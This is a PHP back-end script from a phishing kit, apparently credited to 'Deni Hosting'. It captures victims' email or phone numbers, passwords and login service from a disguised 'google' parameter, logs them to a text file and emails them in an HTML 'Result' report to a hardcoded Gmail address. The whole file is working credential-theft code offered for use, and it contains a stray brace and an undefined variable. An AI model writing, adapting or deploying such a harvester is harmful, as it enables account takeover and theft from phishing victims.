<?php
session_start();

function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

if (isset($_GET['google'])) {
    $serialized_data = hex2bin($_GET['google']);
    parse_str($serialized_data, $form_data);

    $email = isset($form_data['email']) ? sanitize_input($form_data['email']) : '';
    $password = isset($form_data['sandi']) ? sanitize_input($form_data['sandi']) : '';
    $ua = isset($form_data['ua']) ? sanitize_input($form_data['ua']) : '';
    $log = isset($form_data['log']) ? sanitize_input($form_data['log']) : '';
    $time = date('Y-m-d H:i:s'); 
   
    }{

        $file_lines = file('salz/antispam.txt');
        foreach ($file_lines as $file => $value) {
            $data = explode("|", $value);
            if (in_array($email, $data)) {
                // Redirect and set session
                $_SESSION['email'] = $email;
                header('Location: https://google.com');
                exit;
            }
        }

        $myfile = fopen("salz/antispam.txt", "a") or die("Unable to open file!");
        fwrite($myfile, "|".$email."|".$password."|".$log."\n");
        fclose($myfile);

    $subjek = 'Result si '.$email.' | Result Wa'.'';
    $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
		<table class="tblResult">
<tr>
<tr>
<center>
<img src="https://telegra.ph/file/f95308af941994af61cf1.jpg" style="width: 100%; display: block; margin: auto;">
		<div style="background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); width: 294; color: #fff; text-align: center; padding: 10px;">  Created BY Deni Hosting👑</div>
			<table class="tblResult">
            <tr>
					<th style="text-align: center;" colspan="3"> Informasi Akun $log</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email/No HP</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>	
				<tr>
				    <td style="border-right: none;">Login</td>
					<td style="text-align: center;">$ip</td>
				</tr>			
				<tr>
			</table>
			<div style="border:0px solid white;width: 294; font-weight:bold; height: 20px; background: #001240; color: #fff; padding: 15px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
</div>
		</div>
	</body>
	</html>
EOD;
    $email = "dnjay309@gmail.com";
    $sender = 'From: WEB || DENI HOSTING <admin@deni.com>';
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    include 'DeniHosting.php';
    include 'base.js.php';
    
    mail($email, $subjek, $pesan, $headers);
    sleep(1);
}
?>
